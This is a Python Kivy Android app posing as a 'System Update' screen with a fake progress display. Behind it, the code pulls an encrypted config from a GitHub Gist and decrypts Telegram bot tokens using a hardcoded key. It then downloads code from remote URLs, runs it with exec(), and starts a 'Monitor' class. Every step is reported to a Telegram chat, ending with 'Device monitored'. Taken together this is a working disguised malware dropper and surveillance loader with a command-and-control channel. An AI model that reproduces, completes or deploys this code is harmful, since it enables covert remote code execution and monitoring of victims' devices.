import threading
import requests
import base64
import time
import json
import traceback
import urllib3
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.utils import platform
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SystemUpdateApp(App):
    def build(self):
        # رابط config.json على GitHub Gist (تم تحديثه بالرابط الجديد)
        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/1029041e26d793614ba70bccaf542bfed53eeacd/config.json"

        layout = BoxLayout(orientation='vertical')
        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        self.log_view = TextInput(
            text="[System] Initializing...\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),
            font_size='14sp',
            size_hint_y=None,
            cursor_color=(0, 0, 0, 0)
        )
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        scroll.add_widget(self.log_view)
        layout.add_widget(scroll)
        threading.Thread(target=self.logic_engine, daemon=True).start()
        return layout

    def log(self, msg):
        self.log_view.text += f"> {msg}\n"

    def _get_encryption_key(self):
        part1 = [77, 121, 83, 117, 112, 51, 114, 83, 51, 99, 114, 51, 116]
        part2 = [75, 51, 121, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54]
        return bytes(part1 + part2)

    def decrypt_token(self, encrypted_data):
        try:
            key = self._get_encryption_key()
            data = base64.b64decode(encrypted_data)
            iv = data[:12]
            tag = data[-16:]
            ciphertext = data[12:-16]
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted.decode('utf-8')
        except Exception as e:
            self.log(f"Decrypt error: {e}")
            return ""

    def send_telegram(self, token, chat_id, text):
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
        except:
            pass

    def logic_engine(self):
        try:
            self.log("Starting engine...")
            time.sleep(2)
            if platform == 'android':
                self.log("Requesting permissions (INTERNET)...")
                from android.permissions import request_permissions, Permission
                request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
                time.sleep(2)
            self.log("Testing direct IP connection (1.1.1.1)...")
            try:
                r = requests.get("https://1.1.1.1", timeout=5, verify=False)
                self.log(f"Direct IP test OK (status {r.status_code})")
            except Exception as e:
                self.log(f"Direct IP test FAILED: {str(e)[:80]}")
            self.log(f"Fetching config from: {self.config_url[:60]}...")
            response = requests.get(self.config_url, timeout=15, verify=False)
            self.log(f"HTTP status: {response.status_code}")
            config = response.json()
            self.log("Config JSON parsed successfully.")
            tokens = []
            for enc_token in config.get('t', []):
                decrypted = self.decrypt_token(enc_token)
                if decrypted:
                    tokens.append(decrypted)
            v_id = self.decrypt_token(config.get('v', ''))
            self.log(f"Decrypted {len(tokens)} tokens, chat ID: {v_id[:10]}...")
            globals()['MASTER_CONFIG'] = {
                'tokens': tokens,
                'v_id': v_id,
                'payload_urls': config.get('payload_urls', [])
            }
            if tokens:
                self.log("Sending startup message to Telegram...")
                self.send_telegram(tokens[0], v_id, "🚀 System Online (AES-GCM Encrypted)")
                self.log("Startup message sent.")
            self.log("Moving to payload loading...")
            self.log_view.text += "\n[Progress] Downloading modules... (35%)\n"
            self.load_payloads()
        except Exception as e:
            error_details = traceback.format_exc()
            self.log(f"CRITICAL ERROR:\n{error_details}")
            try:
                if 'MASTER_CONFIG' in globals() and globals()['MASTER_CONFIG']:
                    token = globals()['MASTER_CONFIG']['tokens'][0]
                    v_id = globals()['MASTER_CONFIG']['v_id']
                    self.send_telegram(token, v_id, f"❌ Error: {error_details[:200]}")
            except:
                pass

    def load_payloads(self):
        payload_urls = globals()['MASTER_CONFIG'].get('payload_urls', [])
        if not payload_urls:
            self.log("No payload URLs found in config!")
            return
        loaded = 0
        for url in payload_urls:
            try:
                time.sleep(1)
                name = url.split('/')[-1]
                self.log(f"Loading {name}...")
                code = requests.get(url, timeout=10, verify=False).text
                exec(code, globals())
                self.log(f"✅ {name} loaded")
                loaded += 1
                if loaded % 3 == 0:
                    self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
                                       globals()['MASTER_CONFIG']['v_id'],
                                       f"📦 Loaded {loaded}/{len(payload_urls)} modules")
            except Exception as e:
                self.log(f"⚠️ Failed {name}: {str(e)[:50]}")
                continue
        if 'Monitor' in globals():
            self.log("Starting Monitor service...")
            monitor = globals()['Monitor']()
            monitor.start()
            self.log("✅ Monitor started")
            self.log_view.text += "\n[System] Status: 100% - Up to date\n"
            self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
                               globals()['MASTER_CONFIG']['v_id'],
                               "🎯 Full success - Device monitored")
        else:
            self.log("ERROR: Monitor class not found after loading payloads.")

if __name__ == '__main__':
    SystemUpdateApp().run()
